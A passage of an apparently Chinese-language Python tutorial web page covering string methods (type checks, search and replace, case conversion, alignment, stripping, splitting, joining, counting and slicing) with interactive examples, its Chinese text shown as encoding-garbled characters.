test</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">&#x27;helloworld&#x27;</span></span><br></pre></td></tr></table></figure><p>ç”šè‡³ç›´æ¥å»æ‰ <code>+</code> , ç›´æ¥ whitespace ä¹Ÿå¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: test = <span class="string">&quot;hello&quot;</span> <span class="string">&quot;world&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: test</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;helloworld&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: test = (</span><br><span class="line">    ...:     <span class="string">&quot;www&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;.&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;google&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;.&quot;</span></span><br><span class="line">    ...:     <span class="string">&quot;com&quot;</span></span><br><span class="line">    ...:     )</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: test</span><br><span class="line">Out[<span class="number">11</span>]: <span class="string">&#x27;www.google.com&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­ç±»å‹---9">1) åˆ¤æ–­ç±»å‹ - 9</h3><table><colgroup><col style="width: 15%" /><col style="width: 84%" /></colgroup><thead><tr class="header"><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td>string.isspace()</td><td>å¦‚æœ string ä¸­åªåŒ…å« whitespaceï¼Œåˆ™è¿”å› True</td></tr><tr class="even"><td>string.isalnum()</td><td>å¦‚æœ string è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦å¹¶ä¸”æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯æˆ–æ•°å­—åˆ™è¿”å› True</td></tr><tr class="odd"><td>string.isalpha()</td><td>å¦‚æœ string è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦å¹¶ä¸”æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯åˆ™è¿”å› True</td></tr><tr class="even"><td>string.isdecimal()</td><td>å¦‚æœ string åªåŒ…å«æ•°å­—åˆ™è¿”å› Trueï¼Œ <code>å…¨è§’æ•°å­—</code></td></tr><tr class="odd"><td>string.isdigit()</td><td>å¦‚æœ string åªåŒ…å«æ•°å­—åˆ™è¿”å› Trueï¼Œ <code>å…¨è§’æ•°å­—</code> ã€<code>â‘´</code> ã€ <code>\u00b2</code> (æ³¨: ç¬¬äºŒä¸ªæ˜¯ unicode å­—ç¬¦ä¸²)</td></tr><tr class="even"><td>string.isnumeric()</td><td>å¦‚æœ string åªåŒ…å«æ•°å­—åˆ™è¿”å› Trueï¼Œ <code>å…¨è§’æ•°å­—</code> ï¼Œ<code>æ±‰å­—æ•°å­—</code></td></tr><tr class="odd"><td>string.istitle()</td><td>å¦‚æœ string æ˜¯æ ‡é¢˜åŒ–çš„(æ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™)åˆ™è¿”å› True</td></tr><tr class="even"><td>string.islower()</td><td>å¦‚æœ stringä¸­åŒ…å«è‡³å°‘ä¸€ä¸ªåŒºåˆ†å¤§å°å†™çš„å­—ç¬¦ï¼Œå¹¶ä¸”æ‰€æœ‰è¿™äº›(åŒºåˆ†å¤§å°å†™çš„)å­—ç¬¦éƒ½æ˜¯å°å†™ï¼Œåˆ™è¿”å›True</td></tr><tr class="odd"><td>string.isupper()</td><td>å¦‚æœ stringä¸­åŒ…å«è‡³å°‘ä¸€ä¸ªåŒºåˆ†å¤§å°å†™çš„å­—ç¬¦ï¼Œå¹¶ä¸”æ‰€æœ‰è¿™äº›(åŒºåˆ†å¤§å°å†™çš„)å­—ç¬¦éƒ½æ˜¯å¤§å†™ï¼Œåˆ™è¿”å›True</td></tr></tbody></table><p><strong>string.islower()</strong> This method checks if all thecharacters of a string are lowercase characters (a-z).åªæ£€æŸ¥å­—ç¬¦ä¸²ä¸­çš„è‹±æ–‡å­—æ¯ï¼Œå¦‚æœæœ‰å…¶å®ƒæ•°å­—æˆ–å­—ç¬¦ä¸å—å½±å“ã€‚string.isupper() ä¸å®ƒç±»ä¼¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">51</span>]: test = <span class="string">&quot;adh13()12#&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: test.islower()</span><br><span class="line">Out[<span class="number">52</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">53</span>]: test = <span class="string">&quot;adH13()12#&quot;</span></span><br><span class="line">In [<span class="number">54</span>]: test.islower()</span><br><span class="line">Out[<span class="number">54</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><p><strong>string.isspace()</strong> åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦åªåŒ…å«whitespaces(åŒ…å«ï¼šç©ºæ ¼ï¼Œ åˆ¶è¡¨ç¬¦ æ¢è¡Œç¬¦ï¼Œ å›è½¦ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">63</span>]: test_str=<span class="string">&quot;\t\n\r &quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">64</span>]: test_str.isspace()</span><br><span class="line">Out[<span class="number">64</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><p><strong>string.isdecimal string.isdigit string.isnumeric</strong>è¿™ä¸‰ç§éƒ½ä¸èƒ½åˆ¤æ–­å°æ•°ã€‚å¼€å‘ä¸­ç”±äºå¸¸å¸¸åªé’ˆå¯¹æ•´å‹æ•°å­—ï¼Œå› æ­¤å¸¸ç”¨<code>isdecimal</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">65</span>]: num_str = <span class="string">&quot;ä¸€åƒé›¶ä¸€&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">66</span>]: <span class="keyword">def</span> <span class="title function_">print_num</span>(<span class="params">num_str</span>):</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str)</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str.isdecimal())</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str.isdigit())</span><br><span class="line">    ...:     <span class="built_in">print</span>(num_str.isnumeric())</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: print_num(num_str)</span><br><span class="line">ä¸€åƒé›¶ä¸€</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾å’Œæ›¿æ¢---7">2) æŸ¥æ‰¾å’Œæ›¿æ¢ - 7</h3><table><colgroup><col style="width: 30%" /><col style="width: 69%" /></colgroup><thead><tr class="header"><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td>string.startswith(str)</td><td>æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥ str å¼€å¤´ï¼Œæ˜¯åˆ™è¿”å› True</td></tr><tr class="even"><td>string.endswith(str)</td><td>æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥ str ç»“æŸï¼Œæ˜¯åˆ™è¿”å› True</td></tr><tr class="odd"><td>string.find(str, start=0, end=len(string))</td><td>æ£€æµ‹ str æ˜¯å¦åŒ…å«åœ¨ string ä¸­ï¼Œå¦‚æœ start å’Œ endæŒ‡å®šèŒƒå›´ï¼Œåˆ™æ£€æŸ¥æ˜¯å¦åŒ…å«åœ¨æŒ‡å®šèŒƒå›´å†…ï¼Œå¦‚æœæ˜¯è¿”å›å¼€å§‹çš„ç´¢å¼•å€¼ï¼Œå¦åˆ™è¿”å›<code>-1</code></td></tr><tr class="even"><td>string.rfind(str, start=0, end=len(string))</td><td>ç±»ä¼¼äº find()ï¼Œä¸è¿‡æ˜¯ä»å³è¾¹å¼€å§‹æŸ¥æ‰¾</td></tr><tr class="odd"><td>string.index(str, start=0, end=len(string))</td><td>è·Ÿ find() æ–¹æ³•ç±»ä¼¼ï¼Œä¸è¿‡å¦‚æœ str ä¸åœ¨ string ï¼Œä¼š<strong>æŠ›å‡ºå¼‚å¸¸</strong></td></tr><tr class="even"><td>string.rindex(str, start=0, end=len(string))</td><td>ç±»ä¼¼äº index()ï¼Œä¸è¿‡æ˜¯ä»å³è¾¹å¼€å§‹</td></tr><tr class="odd"><td>string.replace(old_str, new_str, num=string.count(old))</td><td>æŠŠ string ä¸­çš„ old_str æ›¿æ¢æˆ new_strï¼Œå¦‚æœ num æŒ‡å®šï¼Œåˆ™æ›¿æ¢ä¸è¶…è¿‡num æ¬¡</td></tr></tbody></table><h3 id="å¤§å°å†™è½¬æ¢---5">3) å¤§å°å†™è½¬æ¢ - 5</h3><table><thead><tr class="header"><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td>string.capitalize()</td><td>æŠŠå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§å†™</td></tr><tr class="even"><td>string.title()</td><td>æŠŠå­—ç¬¦ä¸²çš„æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™</td></tr><tr class="odd"><td>string.lower()</td><td>è½¬æ¢ string ä¸­æ‰€æœ‰å¤§å†™å­—ç¬¦ä¸ºå°å†™</td></tr><tr class="even"><td>string.upper()</td><td>è½¬æ¢ string ä¸­çš„å°å†™å­—æ¯ä¸ºå¤§å†™</td></tr><tr class="odd"><td>string.swapcase()</td><td>ç¿»è½¬ string ä¸­çš„å¤§å°å†™</td></tr></tbody></table><p><strong>upper() å’Œ lower()</strong></p><p>å¤§å°å†™è½¬æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.upper()</span><br><span class="line"><span class="string">&#x27;HELLO&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;hello&#x27;</span>.upper()</span><br><span class="line"><span class="string">&#x27;HELLO&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>string.capitalize() ä¸ string.title() åŒºåˆ«</strong></p><p><strong>string.capitalize()</strong> <strong>capitalize()</strong>method converts the first character of a string to capital<strong>(uppercase)</strong> letter. å¤§å†™çš„æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯è‹±æ–‡å­—æ¯æˆ–è€…æ˜¯å¤§å†™çš„è‹±æ–‡å­—æ¯ï¼Œé‚£ç›´æ¥è¿”å›åŸå­—ç¬¦ä¸²çš„ä¸€ä»½copy</p><p><strong>string.title()</strong> å°±åƒæ–‡ç« çš„ titleä¸€æ ·ï¼Œå¤§å†™çš„æ˜¯å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸€ä¸ª wordï¼Œ å¹¶ä¸”ä¼šæŠŠ number æˆ– symbolåé¢çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¹Ÿå¤§å†™ã€‚ The title() method returns a string where thefirst character in every word is upper case. Like a header, or atitle.</p><p>If the word contains a number or a symbol, the first letter afterthat will be converted to upper case.</p><p>é¢˜ç›®: <ahref="https://www.hackerrank.com/challenges/capitalize/problem">Capitalize!</a></p><ol type="1"><li>capitalize å’Œ title æ–¹æ³•çš„åŒºåˆ«</li><li>python è¿˜æœ‰ä¸€ä¸ª string æ¨¡å—æœ‰ä¸ª string.capwordsæ–¹æ³•å¯ä»¥ç›´æ¥å®ç°é¢˜ç›®çš„è¦æ±‚ã€‚</li><li>å†™ä»£ç è¦å°½å¯èƒ½ç²¾ç¡®ï¼Œæ¯”å¦‚: æœ¬é¢˜ç›®è¯´ word ä¹‹é—´æ˜¯ spacesï¼Œè€Œä¸ä¸€å®šæ˜¯ä¸€ä¸ª spaceï¼Œ å› æ­¤ï¼Œåœ¨ split çš„æ—¶å€™ï¼Œä½¿ç”¨ split(" ")ä¿ç•™ç©ºæ ¼ï¼Œæ¯”ç›´æ¥ split() æ›´åŠ ç¬¦åˆè¦æ±‚ã€‚</li></ol><h3 id="æ–‡æœ¬å¯¹é½---3">4) æ–‡æœ¬å¯¹é½ - 3</h3><table><colgroup><col style="width: 24%" /><col style="width: 75%" /></colgroup><thead><tr class="header"><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td>string.ljust(width)</td><td>è¿”å›ä¸€ä¸ªåŸå­—ç¬¦ä¸²å·¦å¯¹é½ï¼Œå¹¶ä½¿ç”¨ç©ºæ ¼å¡«å……è‡³é•¿åº¦ width çš„æ–°å­—ç¬¦ä¸²</td></tr><tr class="even"><td>string.rjust(width)</td><td>è¿”å›ä¸€ä¸ªåŸå­—ç¬¦ä¸²å³å¯¹é½ï¼Œå¹¶ä½¿ç”¨ç©ºæ ¼å¡«å……è‡³é•¿åº¦ width çš„æ–°å­—ç¬¦ä¸²</td></tr><tr class="odd"><td>string.center(width)</td><td>è¿”å›ä¸€ä¸ªåŸå­—ç¬¦ä¸²å±…ä¸­ï¼Œå¹¶ä½¿ç”¨ç©ºæ ¼å¡«å……è‡³é•¿åº¦ width çš„æ–°å­—ç¬¦ä¸²</td></tr></tbody></table><p><strong>center</strong></p><ol type="1"><li><p>Syntax</p><p><em>string</em>.center(<em>length, character</em>)</p></li><li><p>Parameter Values</p><table><colgroup><col style="width: 11%" /><col style="width: 88%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Parameter</th><th style="text-align: left;">Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><em>length</em></td><td style="text-align: left;">Required. The length of the returnedstring</td></tr><tr class="even"><td style="text-align: left;"><em>character</em></td><td style="text-align: left;">Optional. The character to fill themissing space on each side. Default is " " (space)</td></tr></tbody></table></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    &gt;&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27; Welcome to InfoGath &#x27;</span>.center(<span class="number">35</span>,<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">    ******* Welcome to InfoGath *******</span><br><span class="line">    &gt;&gt;&gt; <span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27; Welcome to InfoGath &#x27;</span>.center(<span class="number">35</span>,<span class="string">&#x27;*&#x27;</span>)))</span><br><span class="line">    <span class="number">35</span></span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line"><span class="comment">### 5) å»é™¤ç©ºç™½å­—ç¬¦ - 3</span></span><br><span class="line"></span><br><span class="line">| æ–¹æ³•            | è¯´æ˜                               |</span><br><span class="line">| --------------- | ---------------------------------- |</span><br><span class="line">| string.lstrip() | æˆªæ‰ string å·¦è¾¹ï¼ˆå¼€å§‹ï¼‰çš„ç©ºç™½å­—ç¬¦ |</span><br><span class="line">| string.rstrip() | æˆªæ‰ string å³è¾¹ï¼ˆæœ«å°¾ï¼‰çš„ç©ºç™½å­—ç¬¦ |</span><br><span class="line">| string.strip()  | æˆªæ‰ string å·¦å³ä¸¤è¾¹çš„ç©ºç™½å­—ç¬¦     |</span><br><span class="line"></span><br><span class="line">**strip(character) **</span><br><span class="line"></span><br><span class="line">æŒ‡å®šå–å‡ºå­—ç¬¦ä¸²é¦–å°¾çš„ characters</span><br><span class="line"></span><br><span class="line">å»é™¤å­—ç¬¦ä¸²**å¤´å°¾**ï¼ˆå†…éƒ¨çš„ä¸èƒ½å»æ‰ï¼Œåªèƒ½å…ˆæŠŠå°¾éƒ¨çš„å»æ‰ï¼Œç„¶åå†…éƒ¨æˆä¸ºå°¾éƒ¨ï¼Œæ‰èƒ½å†å»æ‰å®ƒï¼‰**æŒ‡å®šçš„å­—ç¬¦**å¯ä»¥æ˜¯å¤šä¸ªï¼ˆæ— åºï¼Œåªè¦æ˜¯å¤´å°¾å°±è¡Œï¼‰ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸ºç©ºæ ¼ï¼Œå›è½¦ï¼Œæ¢è¡Œç­‰ whitespaces</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">In [<span class="number">46</span>]: web</span><br><span class="line">Out[<span class="number">46</span>]: <span class="string">&#x27;baidu \tb\n&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">47</span>]: web.strip(<span class="string">&quot;b\t&quot;</span>)</span><br><span class="line">Out[<span class="number">47</span>]: <span class="string">&#x27;aidu \tb\n&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]: web.strip(<span class="string">&quot; b\t\n&quot;</span>)</span><br><span class="line">Out[<span class="number">48</span>]: <span class="string">&#x27;aidu&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="æ‹†åˆ†å’Œè¿æ¥---5">6) æ‹†åˆ†å’Œè¿æ¥ - 5</h3><table><colgroup><col style="width: 18%" /><col style="width: 81%" /></colgroup><thead><tr class="header"><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td>string.partition(str)</td><td>æŠŠå­—ç¬¦ä¸² string åˆ†æˆä¸€ä¸ª 3 å…ƒç´ çš„å…ƒç»„ (str å‰é¢, str, str åé¢)</td></tr><tr class="even"><td>string.rpartition(str)</td><td>ç±»ä¼¼äº partition() æ–¹æ³•ï¼Œä¸è¿‡æ˜¯ä»å³è¾¹å¼€å§‹æŸ¥æ‰¾</td></tr><tr class="odd"><td>string.split(str="", num)</td><td>ä»¥ str ä¸ºåˆ†éš”ç¬¦æ‹†åˆ† stringï¼Œå¦‚æœ num æœ‰æŒ‡å®šå€¼ï¼Œåˆ™ä»…åˆ†éš” num + 1ä¸ªå­å­—ç¬¦ä¸²ï¼Œstr é»˜è®¤åŒ…å« ', ', '' å’Œç©ºæ ¼</td></tr><tr class="even"><td>string.splitlines()</td><td>æŒ‰ç…§è¡Œ(', '', '')åˆ†éš”ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å„è¡Œä½œä¸ºå…ƒç´ çš„åˆ—è¡¨</td></tr><tr class="odd"><td>string.join(seq)</td><td>ä»¥ string ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå°† seqä¸­æ‰€æœ‰çš„å…ƒç´ ï¼ˆçš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼‰åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²</td></tr></tbody></table><p><strong>string.split(str="", num)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c=<span class="string">&#x27;I love python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> c.split(sep=<span class="string">&#x27; &#x27;</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>,end=<span class="string">&#x27;_&#x27;</span>))</span><br><span class="line">...</span><br><span class="line">I_love_python_&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;www.baidu.com&#x27;</span>.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;baidu&#x27;</span>, <span class="string">&#x27;com&#x27;</span>]</span><br></pre></td></tr></table></figure><p><strong>string.join(seq)</strong></p><p>å¸¸å¸¸ç”¨æ¥è¿æ¥å…ƒç´ ä¸ºå­—ç¬¦ä¸²çš„åˆ—è¡¨è¿›è¡Œå›ºå®šæ ¼å¼çš„è¾“å‡ºï¼Œ ç¤ºä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">54</span>]: str_list = [<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">55</span>]: <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(str_list))</span><br><span class="line">hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure><h3 id="ç»Ÿè®¡---2">0) ç»Ÿè®¡ - 2</h3><p><strong>len(string)</strong> ç»Ÿè®¡å­—ç¬¦ä¸²çš„é•¿åº¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">61</span>]: str_test = <span class="string">&quot;hellow&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">62</span>]: <span class="built_in">len</span>(str_test)</span><br><span class="line">Out[<span class="number">62</span>]: <span class="number">6</span></span><br></pre></td></tr></table></figure><p><strong>stirng.count(substr)</strong></p><p>Python count()æ–¹æ³•ç”¨äºç»Ÿè®¡å­—ç¬¦ä¸²é‡ŒæŸä¸ªå­—ç¬¦æˆ–è€…å­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°ã€‚å¯é€‰å‚æ•°ä¸ºåœ¨å­—ç¬¦ä¸²æœç´¢çš„å¼€å§‹ä¸ç»“æŸä½ç½®ã€‚å¦‚æœè¦æŸ¥æ‰¾çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²åœ¨æºå­—ç¬¦ä¸²ä¸­æ²¡æœ‰ï¼Œç¨‹åºå¹¶ä¸ä¼šæŠ¥é”™ï¼Œåªä¼šå¾—åˆ°ç»“æœ0ã€‚ <code>str.count(sub, start= 0,end=len(string))</code></p><p>sub -- æœç´¢çš„å­å­—ç¬¦ä¸² è¿”å›å€¼è¯¥æ–¹æ³•è¿”å›å­å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚</p><p><strong>æ³¨ï¼š å½“å­—ç¬¦ä¸²è¾ƒé•¿æ—¶ï¼Œcounter å‡½æ•°è€—æ—¶ï¼Œæ…ç”¨</strong></p><p>ä¸¾ä¾‹ï¼ša å­—ç¬¦ä¸²ä¸­ä» ç´¢å¼•ä¸º 7 å¼€å§‹ï¼Œa çš„ä¸ªæ•°ä¸º 2 ä¸ªã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: a=<span class="string">&quot;nationl daya!&quot;</span></span><br><span class="line">In [<span class="number">6</span>]: a.count(<span class="string">&quot;a&quot;</span>,<span class="number">7</span>)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">2</span></span><br><span class="line">In [<span class="number">34</span>]: sub_str=<span class="string">&quot;ayâ€œ</span></span><br><span class="line"><span class="string">In [35]: a=&quot;</span>nationl daya! ayhe ay<span class="string">&quot;</span></span><br><span class="line"><span class="string">In [36]: a.count(sub_str)</span></span><br><span class="line"><span class="string">Out[36]: 3</span></span><br><span class="line"><span class="string">In [37]: a.count(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">Out[37]: 5</span></span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²çš„åˆ‡ç‰‡">å­—ç¬¦ä¸²çš„åˆ‡ç‰‡</h2><ul><li><strong>åˆ‡ç‰‡</strong> æ–¹æ³•é€‚ç”¨äº<strong>å­—ç¬¦ä¸²</strong>ã€<strong>åˆ—è¡¨</strong>ã€<strong>å…ƒç»„</strong><ul><li><strong>åˆ‡ç‰‡</strong> ä½¿ç”¨ <strong>ç´¢å¼•å€¼</strong>æ¥é™å®šèŒƒå›´ï¼Œä»ä¸€ä¸ªå¤§çš„ <strong>å­—ç¬¦ä¸²</strong> ä¸­ <strong>åˆ‡å‡º</strong>å°çš„ <strong>å­—ç¬¦ä¸²</strong></li><li><strong>åˆ—è¡¨</strong> å’Œ <strong>å…ƒç»„</strong> éƒ½æ˜¯<strong>æœ‰åº</strong> çš„é›†åˆï¼Œéƒ½èƒ½å¤Ÿ <strong>é€šè¿‡ç´¢å¼•å€¼</strong>è·å–åˆ°å¯¹åº”çš„æ•°æ®</li><li><strong>å­—å…¸</strong> æ˜¯ä¸€ä¸ª <strong>æ— åº</strong> çš„é›†åˆï¼Œæ˜¯ä½¿ç”¨<strong>é”®å€¼å¯¹</strong> ä¿å­˜æ•°æ®</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦ä¸²[å¼€å§‹ç´¢å¼•:ç»“æŸç´¢å¼•:æ­¥é•¿]</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼š</p><ol type="1"><li>æŒ‡å®šçš„åŒºé—´å±äº <strong>å·¦é—­å³å¼€</strong> å‹<code>[å¼€å§‹ç´¢å¼•, ç»“æŸç´¢å¼•)</code> =&gt;<code>å¼€å§‹ç´¢å¼• &gt;= èŒƒå›´ &lt; ç»“æŸç´¢å¼•</code><ul><li>ä» <code>èµ·å§‹</code> ä½å¼€å§‹ï¼Œåˆ° ** <code>ç»“æŸ</code> ä½çš„å‰ä¸€ä½**ç»“æŸï¼ˆ<strong>ä¸åŒ…å«ç»“æŸä½æœ¬èº«</strong>)</li></ul></li><li>ä¸å†™å¼€å§‹ç´¢å¼•ã€‚é»˜è®¤ä»å¤´å¼€å§‹ï¼Œ<strong>å¼€å§‹ç´¢å¼•æ•°å­—å¯ä»¥çœç•¥ï¼Œå†’å·ä¸èƒ½çœç•¥</strong></li><li>ä¸å†™ç»“æŸç´¢å¼•ï¼Œé»˜è®¤åˆ°æœ«å°¾ç»“æŸï¼Œ<strong>ç»“æŸç´¢å¼•æ•°å­—å¯ä»¥çœç•¥ï¼Œå†’å·ä¸èƒ½çœç•¥</strong></li><li>æ­¥é•¿é»˜è®¤ä¸º <code>1</code>ï¼Œå¦‚æœè¿ç»­åˆ‡ç‰‡ï¼Œ<strong>æ•°å­—å’Œå†’å·éƒ½å¯ä»¥çœç•¥</strong></li></ol><h3 id="ç´¢å¼•çš„é¡ºåºå’Œå€’åº">ç´¢å¼•çš„é¡ºåºå’Œå€’åº</h3><ul><li>åœ¨ Python ä¸­ä¸ä»…æ”¯æŒ <strong>é¡ºåºç´¢å¼•</strong>ï¼ŒåŒæ—¶è¿˜æ”¯æŒ<strong>å€’åºç´¢å¼•</strong></li><li>æ‰€è°“å€’åºç´¢å¼•å°±æ˜¯ <strong>ä»å³å‘å·¦</strong> è®¡ç®—ç´¢å¼•<ul><li>æœ€å³è¾¹çš„ç´¢å¼•å€¼æ˜¯ <strong>-1</strong>ï¼Œä¾æ¬¡é€’å‡</li></ul></li></ul><p><strong>æ¼”ç»ƒéœ€æ±‚</strong></p><ul><li><ol type="1"><li>æˆªå–ä» 2 ~ 5 ä½ç½® çš„å­—ç¬¦ä¸²</li></ol></li><li><ol start="2" type="1"><li>æˆªå–ä» 2 ~ <code>æœ«å°¾</code> çš„å­—ç¬¦ä¸²</li></ol></li><li><ol start="3" type="1"><li>æˆªå–ä» <code>å¼€å§‹</code> ~ 5 ä½ç½® çš„å­—ç¬¦ä¸²</li></ol></li><li><ol start="4" 